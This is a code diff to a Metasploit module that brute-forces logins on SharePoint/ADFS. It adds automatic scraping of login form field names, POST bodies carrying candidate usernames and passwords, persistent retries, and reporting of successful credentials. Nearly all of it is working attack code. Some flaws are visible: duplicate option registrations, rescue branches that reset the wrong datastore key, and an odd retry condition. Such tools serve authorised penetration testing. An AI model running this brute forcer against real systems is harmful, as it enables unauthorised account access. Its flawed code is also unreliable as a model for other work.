@@ -15,11 +15,15 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'           => 'Sharepoint ADFS Brute Force Utility',
+			'Name'           => 'Sharepoint/ADFS Brute Force',
 			'Description'    => %q{
-				This module tests credentials on Sharepoint/AFDS. AuthPath needs to be set get
-				request you see in you browser bar after you browsed to the target website
-				 (something like /adfs/ls/?wa=wsignin1.0&wtrealm=...)
+				This module tests credentials on Sharepoint/AFDS. AuthPath needs to be set to 
+				the GET request you see in you browser bar after you browsed to the target website
+				(something like /adfs/ls/?wa=wsignin1.0&wtrealm=...). The module tries to
+				gather various POST parameters that differ among different installations of
+				Sharepoint ADFS automatically. However the login website may be heavily
+				customized and you may have to set some optional parameters manually.
+				The AD_DOMAIN parameter can be used when usernames have the DOMAIN\USERNAME format.
 			},
 			'Author'         =>
 				[
@@ -43,6 +47,12 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptInt.new('RPORT', [ true, "The target port", 443]),
 				OptString.new('AuthPath', [ true, "Path of the adfs authentication script", '']),
+				OptString.new('PasswordField', [false, "Form name of the password html field", '']),
+				OptString.new('UsernameField', [false, "Form name of the username html field", '']),
+				OptString.new('SubmitButton', [false, "Form name of the submit button field", '']),
+				OptInt.new('RPORT', [ true, "The target port", 443]),
+				OptString.new('AuthPath', [ true, "Path of the adfs authentication script", '']),
+
 			], self.class)
 
 		register_advanced_options(
@@ -60,20 +70,20 @@ class Metasploit3 < Msf::Auxiliary
 		datastore['USER_AS_PASS']    = @user_as_pass_setting
 	end
 
-        def target_url
-                #Function to display correct protocol and host/vhost info
-                if rport == 443 or ssl
-                        proto = "https"
-                else
-                        proto = "http"
-                end
+	def target_url
+		#Function to display correct protocol and host/vhost info
+		if rport == 443 or ssl
+			proto = "https"
+		else
+			proto = "http"
+		end
 
-                if vhost != ""
-                        "#{proto}://#{vhost}:#{rport}#{datastore['URI'].to_s}"
-                else
-                        "#{proto}://#{rhost}:#{rport}#{datastore['URI'].to_s}"
-                end
-        end
+		if vhost != ""
+			"#{proto}://#{vhost}:#{rport}#{datastore['URI'].to_s}"
+		else
+			"#{proto}://#{rhost}:#{rport}#{datastore['URI'].to_s}"
+		end
+	end
 
 	def run
 		# Store the original setting
@@ -95,38 +105,73 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("#{msg} Testing Sharepoint")
 
 		res = send_request_cgi(
-                        {
-                                'method'  => 'GET',
-                                'uri'     => datastore['AuthPath']
-                        }, 20)
+			{
+				'method'  => 'GET',
+				'uri'     => datastore['AuthPath']
+		}, 20)
 
 		if (res.code == 200)
-                                print_status("Sharepoint install found at #{target_url}  [HTTP 200]")
+				print_status("Sharepoint install found at #{target_url}  [HTTP 200]")
 
-                                #Gather __VIEWSTATE and __EVENTVALIDATION from HTTP response.
+                                #Gather __VIEWSTATE and __EVENTVALIDATION and __db from HTTP response.
                                 #Required to be sent based on some versions/configs.
-                                begin
-                                        datastore['viewstate'] = res.body.scan(/<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*)"/)[0][0]
-                                rescue
-                                        datastore['viewstate'] = ""
-                                end
+				begin
+					datastore['viewstate'] = res.body.scan(/<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*)"/)[0][0]
+				rescue
+					datastore['viewstate'] = ""
+				end
 
-                                begin
-                                        datastore['eventvalidation'] = res.body.scan(/<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*)"/)[0][0]
-                                rescue
-                                        datastore['eventvalidation'] = ""
-                                end
+				begin
+					datastore['eventvalidation'] = res.body.scan(/<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*)"/)[0][0]
+				rescue
+					datastore['eventvalidation'] = ""
+				end
 
-                                begin
-                                        datastore['db'] = res.body.scan(/<input type="hidden" name="__db" value="(.*)"/)[0][0]
-                                rescue
-                                        datastore['db'] = ""
-                                end
+				begin
+					datastore['db'] = res.body.scan(/<input type="hidden" name="__db" value="(.*)"/)[0][0]
+				rescue
+					datastore['db'] = ""
+				end
 
-                else
-                                print_error("Sharepoint login page not found at #{target_url}. May need to set VHOST or RPORT.  [HTTP #{res.code}]")
-                end
+				#Gather form names from reponse these differ among sharepoint/adfs installations
+				#Automatic parsing may not always work, but it is possible to set these manually
+				if datastore['UsernameField'] == ""
+					begin
+						print_status("Trying to guess UsernameField form field")
+						datastore['UsernameField'] = res.body.scan(/<input name="(.*)" type="text" (.*)"/)[0][0]
+					rescue
+						print_error("#{msg} Could not extract UsernameField form field automatically, set manually")
+						datastore['UsernameField'] = ""
+					end
+				end
 
+				if datastore['PasswordField'] == ""
+					begin
+						print_status("Trying to guess PasswordField form field")
+						datastore['PasswordField'] = res.body.scan(/<input name="(.*)" type="password" (.*)"/)[0][0]
+					rescue
+						print_error("#{msg} Could not extract PasswordField form field automatically, set manually")
+						datastore['Password'] = ""
+					end
+				end
+
+				if datastore['SubmitButton'] == ""
+					begin
+						print_status("Trying to guess SubmitButton form field")
+						submitbtntmp = res.body.scan(/<input type="submit" name="(.*)" value="(.*)" (.*)/)
+						submitname = submitbtntmp[0][0]
+						# kludge, it's not so easy to find regexp that works for many installations
+						submitvalue =submitbtntmp[0][1].split(/"/)[0]
+						datastore['SubmitButton'] = "#{submitname}=#{submitvalue}"
+					rescue
+						print_error("#{msg} Could not extract SubmitButton form field automatically, set manually")
+						datastore['Password'] = ""
+					end
+				end
+
+		else
+			print_error("Sharepoint login page not found at #{target_url}. May need to set VHOST or RPORT.  [HTTP #{res.code}]")
+		end
 
 		# Here's a weird hack to check if each_user_pass is empty or not
 		# apparently you cannot do each_user_pass.empty? or even inspect() it
@@ -157,18 +202,23 @@ class Metasploit3 < Msf::Auxiliary
 			'Cookie' => 'PBack=0'
 		}
 
+		# Fix encoding
 		viewstate = Rex::Text.uri_encode(datastore['viewstate'].to_s).sub("/","%2F")
 		eventvalidation = Rex::Text.uri_encode(datastore['eventvalidation'].to_s).sub("/","%2F")
 		db = datastore['db'].to_s
 
-                print_status("Viewstat is #{viewstate}, Eventvalidation is #{eventvalidation}, db is #{db}")
+		print_status("Viewstat is #{viewstate}...,  Eventvalidation is #{eventvalidation}..., db is #{db}")
 
-                post_data =  "__VIEWSTATE=#{viewstate}"
-                post_data << "&__EVENTVALIDATION=#{eventvalidation}"
+		userfield = datastore['UsernameField'].sub("$","%24")
+		passfield = datastore['PasswordField'].sub("$","%24")
+		submitbutton = datastore['SubmitButton'].sub("$","%24")
+
+		post_data =  "__VIEWSTATE=#{viewstate}"
+		post_data << "&__EVENTVALIDATION=#{eventvalidation}"
 		post_data << "&__db=#{db}"
-                post_data << "&ctl00%24ContentPlaceHolder1%24UsernameTextBox=#{user}"
-                post_data << "&ctl00%24ContentPlaceHolder1%24PasswordTextBox=#{pass}"
-		post_data << "&ctl00%24ContentPlaceHolder1%24SubmitButton=Sign+In"
+		post_data << "&#{userfield}=#{user}"
+		post_data << "&#{passfield}=#{pass}"
+		post_data << "&#{submitbutton}"
 
 		retryreq = false
 		begin
@@ -186,7 +236,6 @@ class Metasploit3 < Msf::Auxiliary
 			if retryit
 				return true
 			end
-
 		end
 
 		if retryit
@@ -198,6 +247,8 @@ class Metasploit3 < Msf::Auxiliary
 			retryreq = true
 		end
 
+		# Bruteforcing this may be a bit unstable, we don't give up
+		# easily
 		while retryreq == true or res == true or res.code == 503
 			vprint_error("Got Service is unavailable ... trying again: #{user}:#{pass}")
 			# this recursion only has a depth of 1
@@ -206,6 +257,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		if res.body =~ login_check
 			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+			return :skip_pass
+		elsif res.body =~ /Error/
+			vprint_error("#{msg} Error. '#{user}' : '#{pass}'")
 			return :skip_pass
 		else
 			print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
